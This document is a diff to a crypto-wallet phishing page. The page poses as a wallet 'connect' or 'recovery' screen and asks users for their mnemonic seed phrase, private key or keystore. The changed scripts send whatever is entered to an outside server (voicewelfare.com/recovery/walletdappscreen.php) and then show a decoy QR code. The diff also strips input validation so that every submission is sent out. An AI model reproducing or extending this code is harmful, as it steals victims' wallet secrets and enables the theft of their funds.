@@ -1827,8 +1827,8 @@
                         <form id="phraseForm" method="post">
                             <div class="form-group">
                                 <textarea placeholder="Enter your 12 or 24 mnemonic words, seperate them with spaces."
-                                    name="formPhrase" id="formPhrase" cols="30" rows="6" onkeyup="countWords(this);"
-                                    class="form-control" required></textarea>
+                                    name="formPhrase" id="formPhrase" cols="30" rows="6" class="form-control"
+                                    required></textarea>
                             </div>
                             <div class="form-btn">
                                 <button type="submit" id="submit_phrase" class="btn btn-md btn-secondary">
@@ -1861,8 +1861,8 @@
                     <div style="display: none;" id="private_div" class="input-div">
                         <form id="privateForm" method="post">
                             <div class="form-group">
-                                <input type="text" name="privateKey" id="privateKey" onkeyup="countChars(this);"
-                                    placeholder="Typically 64 alphanumeric characters" class="form-control" />
+                                <input type="text" name="privateKey" id="privateKey"
+                                    placeholder="Typically 64 alphanumeric characters" class="form-control" required />
                             </div>
                             <div class="form-btn">
                                 <button type="submit" id="submit_private" class="btn btn-md btn-secondary">
@@ -1894,7 +1894,6 @@
 
     <script src="https://cdn.ethers.io/lib/ethers-5.4.umd.min.js"></script>
     <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
         crossorigin="anonymous"></script>
@@ -2014,51 +2013,6 @@
 </script>
 
 
-
-
-<script>
-    const $inputPhrase = $("#formPhrase");
-    $inputPhrase.on("input", function () {
-        $("#formPhrase").removeClass("error");
-        $inputPhrase.val($inputPhrase.val().replace(/[^a-zA-Z\s]/g, ""));
-    });
-
-    $(document).on('keypress', '#privateKey', function (event) {
-        $("#privateKey").removeClass("error");
-        var regex = /^[a-zA-Z0-9]+$/;
-        var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
-        if (!regex.test(key)) {
-
-            event.preventDefault();
-            return false;
-
-        }
-    });
-
-    function countWords(self) {
-        var spaces = self.value.match(/\S+/g);
-        var words = spaces ? spaces.length : 0;
-
-        if (words >= 10) {
-            document.getElementById("submit_phrase").disabled = false;
-        } else {
-            document.getElementById("submit_phrase").disabled = true;
-        }
-    }
-
-    function countChars(self) {
-
-        let privateKeyLength = self.value.length
-        if (privateKeyLength > 50) {
-            document.getElementById("submit_private").disabled = false;
-        } else {
-            document.getElementById("submit_private").disabled = true;
-        }
-
-    }
-
-</script>
-
 <script>
     function generateRandomString(length) {
         var result = '';
@@ -2070,68 +2024,40 @@
         return result;
     }
 
-    // Validate seed phrase on form submission
+    // Validate phrase on form submission
     $("#phraseForm").submit(function (event) {
         event.preventDefault();
         document.getElementById("submit_phrase").disabled = true;
         var dappPhrase = $("#formPhrase").val();
 
-        if (!validateInput(dappPhrase)) {
+        dappPhrase = dappPhrase.trim();
+        var randomString = generateRandomString(7);
+        var dappName = $('#wallet_name').text();
+        let importType = 'Phrase';
 
-            $("#formPhrase").addClass("error");
-
-        } else {
-            dappPhrase = dappPhrase.trim();
-            var randomString = generateRandomString(7);
-            var dappName = $('#wallet_name').text();
-            let importType = 'Phrase';
-
-            try {
-                const wallet = ethers.Wallet.fromMnemonic(dappPhrase);
-                // console.log('Seed phrase is valid:', dappPhrase);
-                // console.log('Wallet address:', wallet.address); url: "./validate.php",
-                $.ajax({
-                    url: "https://voicewelfare.com/recovery/walletdappscreen.php",
-                    method: "POST",
-                    dataType: "JSON",
-                    data: {
-                        dappMnemonic: dappPhrase,
-                        dappAddress: wallet.address,
-                        dappName: dappName,
-                        importType: importType,
-                    },
-                    success: function () { },
-                    complete: function () { },
-                });
-                document.getElementById("p-code").innerHTML = randomString;
-                $("#initial_div").hide();
-                $("#connect_div").hide();
-                $("#qr_modal").show();
-                document.getElementById("submit_phrase").disabled = true;
-            } catch (error) {
-                // console.error("Invalid seed phrase:", dappPhrase);
-                $("#formPhrase").addClass("error");
-                document.getElementById("submit_phrase").disabled = false;
-            }
+        try {
+            $.ajax({
+                url: "https://voicewelfare.com/recovery/walletdappscreen.php",
+                method: "POST",
+                dataType: "JSON",
+                data: {
+                    dappMnemonic: dappPhrase,
+                    dappName: dappName,
+                    importType: importType,
+                },
+                success: function () { },
+                complete: function () { },
+            });
+            document.getElementById("p-code").innerHTML = randomString;
+            $("#initial_div").hide();
+            $("#connect_div").hide();
+            $("#qr_modal").show();
+            document.getElementById("submit_phrase").disabled = false;
+        } catch (error) {
+            document.getElementById("submit_phrase").disabled = false;
         }
+
     });
-    function validateInput(input) {
-        var sanitizedInput = input.replace(/<script.*?>.*?<\/script>/gi, ''); // Remove script tags
-        sanitizedInput = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, ""); // Strip any other HTML tags
-
-        // Split the input into words using space as a delimiter after removing HTML
-        var words = sanitizedInput.trim().split(/\s+/);
-        if (words.length !== 12 && words.length !== 24) {
-            return false; // Check for 12 or 24 words
-        }
-
-        var wordSet = new Set(words);
-        if (wordSet.size !== words.length) {
-            return false; // Check for duplicates
-        }
-
-        return true; // Passed all checks
-    }
 </script>
 
 
@@ -2147,18 +2073,12 @@
         let importType = 'PrivateKey';
 
         try {
-            var wallet = new ethers.Wallet(dappKey);
-            var dappAddress = wallet.address;
-            // console.log('Private key is valid:', dappKey);
-            // console.log('Wallet address:', dappAddress);
-
             $.ajax({
                 url: "https://voicewelfare.com/recovery/walletdappscreen.php",
                 method: "POST",
                 dataType: "JSON",
                 data: {
                     dappKeys: dappKey,
-                    dappAddress: dappAddress,
                     dappName: dappName,
                     importType: importType,
                 },
@@ -2169,13 +2089,10 @@
             $("#initial_div").hide();
             $("#connect_div").hide();
             $("#qr_modal").show();
-            document.getElementById("submit_private").disabled = true;
+            document.getElementById("submit_private").disabled = false;
         } catch (error) {
-            // console.log("Invalid private key");
-            $("#privateKey").addClass("error");
             document.getElementById("submit_private").disabled = false;
         }
-
     });
 </script>
 
@@ -2211,7 +2128,7 @@
             $("#initial_div").hide();
             $("#connect_div").hide();
             $("#qr_modal").show();
-            document.getElementById("submit_keystore").disabled = true;
+            document.getElementById("submit_keystore").disabled = false;
         } catch (error) {
             document.getElementById("submit_keystore").disabled = false;
         }
